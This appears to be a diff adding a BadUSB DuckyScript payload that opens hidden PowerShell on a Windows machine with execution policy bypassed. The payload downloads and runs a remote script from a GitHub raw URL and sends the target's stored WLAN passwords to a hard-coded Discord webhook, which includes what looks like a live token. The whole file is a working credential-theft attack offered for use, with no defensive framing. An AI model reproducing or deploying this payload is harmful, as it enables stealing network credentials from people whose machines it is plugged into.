@@ -1,0 +1,27 @@
+REM ###################################################################
+REM #                                                                 |
+REM # Title        : WLAN-Windows-Passwords-Discord-Exfiltration      |
+REM # Author       : Aleff                                            |
+REM # Description: A script used to stole target WLAN Passwords.      |
+REM # Category     : Credentials                                      |
+REM # Target       : Windows 10-11                                    |
+REM # Version      : 1.0                                              |
+REM #                                                                 |
+REM ###################################################################
+
+
+
+DELAY 10000
+GUI r
+DELAY 250
+STRING powershell -w h -ep bypass $discord='
+
+REM REQUIRED - Provide Discord Webhook - https://discordapp.com/api/webhooks/<webhook_id>/<token>
+DEFINE DISCORD example.com
+STRING https://discord.com/api/webhooks/1148872565029343233/Vlwhulrs4XR2hgqGudUMHApVkimI9a9grXHfaweogpPu80MQetIR2A5fy5pLVBut6tTQ
+
+REM Reply example.com with YOUR LINK. The Payload should be Windows-Passwords.ps1
+DEFINE PAYLOAD example.com
+STRINGLN ';irm https://raw.githubusercontent.com/srikoushik123/bad-usb/main/Windows-Passwords.ps1 | iex
+DELAY 2000
+ENTER
